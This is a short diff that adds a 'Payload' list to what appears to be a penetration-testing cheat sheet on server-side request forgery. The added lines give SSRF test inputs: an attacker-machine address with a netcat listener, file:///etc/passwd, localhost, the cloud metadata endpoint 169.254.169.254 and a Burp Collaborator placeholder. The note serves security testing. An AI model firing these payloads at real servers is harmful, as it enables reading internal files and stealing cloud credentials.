@@ -33,3 +33,10 @@
 - You may need to use an open redirect to redirect the machine to your destination host
 - The current host may be able to communicate with other machines on the network (that may require being on corporate VPN)
 - Make sure the request comes from the remote server and not your personal IP address
+
+# Payload
+- http://134.209.1.150:8000 (nc is running on attacker machine))
+- file:///etc/passwd
+- http://localhost
+- http://169.254.169.254/metadata/v1
+- Copy and paste *Burp Collaborator* address
